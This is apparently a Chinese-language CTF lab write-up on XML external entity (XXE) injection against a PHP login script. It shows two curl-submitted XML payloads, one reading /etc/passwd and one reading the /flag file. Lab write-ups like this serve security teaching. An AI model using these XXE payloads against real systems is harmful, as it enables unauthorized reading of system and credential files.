# lab_XXE

1. 這題也因為可以看到 Source Code，因此也可以直接去理解程式碼，它是使用 PHP 處理 XML 資料，會從 **`php://input`** 讀取資料並進行 urldecode，接著使用 DOMDocument 的 loadXML() 方法載入資料。如果載入失敗，程式會停止執行並顯示原始程式碼。如果載入成功，程式會將資料轉換為 simplexml 物件，並擷取其中的 "user"。最後，會顯示 "You have logged in as user $user"。

![截圖 2023-01-05 下午1.51.27.png](lab_XXE%20b4253c985e604ef5b779b38b86f61bf0/%25E6%2588%25AA%25E5%259C%2596_2023-01-05_%25E4%25B8%258B%25E5%258D%25881.51.27.png)

1. 所以這題我們要上傳一段資料進去，讓他讀取完資料後可以回傳 $user 的值，而 user 的值，我們可以透過上傳的檔案去控制，首先我們先構造一段 xml 檔去可以去讀取檔案內容。然後使用 
    
    `curl [http://h4ck3r.quest:8604](http://h4ck3r.quest:8604/) -d @read_local_file.xml`傳入檔案，然後就可以成功讀取 “/etc/passwd”。
    
    ```xml
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE ANY [
    <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <test>
        <user>&xxe;</user>
    </test>
    ```
    
    ![截圖 2023-01-05 下午2.07.37.png](lab_XXE%20b4253c985e604ef5b779b38b86f61bf0/%25E6%2588%25AA%25E5%259C%2596_2023-01-05_%25E4%25B8%258B%25E5%258D%25882.07.37.png)
    

1. 因為已經可以讀檔，接下來就`curl [http://h4ck3r.quest:8604](http://h4ck3r.quest:8604/) -d @payload.xml`
直接嘗試讀取根目錄下的 /flag 檔案，然後就成功獲得 FLAG。
    
    ```xml
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE Any [
    <!ENTITY xxe SYSTEM "file:///flag"> ]>
    <test>
        <user>&xxe;</user>
    </test>
    ```
    
    ![截圖 2023-01-05 下午2.19.59.png](lab_XXE%20b4253c985e604ef5b779b38b86f61bf0/%25E6%2588%25AA%25E5%259C%2596_2023-01-05_%25E4%25B8%258B%25E5%258D%25882.19.59.png)